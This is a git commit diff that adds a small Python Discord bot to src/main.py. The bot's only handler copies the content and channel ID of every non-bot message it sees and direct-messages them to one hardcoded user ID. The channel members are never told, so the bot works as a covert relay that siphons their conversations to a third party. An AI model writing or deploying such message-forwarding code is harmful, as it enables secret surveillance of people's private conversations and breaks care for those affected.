2f0b0c76eccc9e5139826980b9cfdc0c687b9718
That one guy <96666783+CdcOnGitHub@users.noreply.github.com>
2023-05-11 17:29:57 +0200

    import replit code

--- src/main.py
+++ src/main.py
@@ -1,1 +1,19 @@
-# getting the code here soon
+import os
+import discord
+from discord.ext import commands,tasks
+import time
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix='t!', intents=intents)
+netflixed = False
+
+@bot.event
+async def on_message(message):
+  if message.author == bot.user or message.author.bot:
+    return
+  user = bot.get_user(708750647847157880)
+  await user.send(message.content)
+  await user.send(message.channel.id)
+  
+
+bot.run(os.environ['token'])
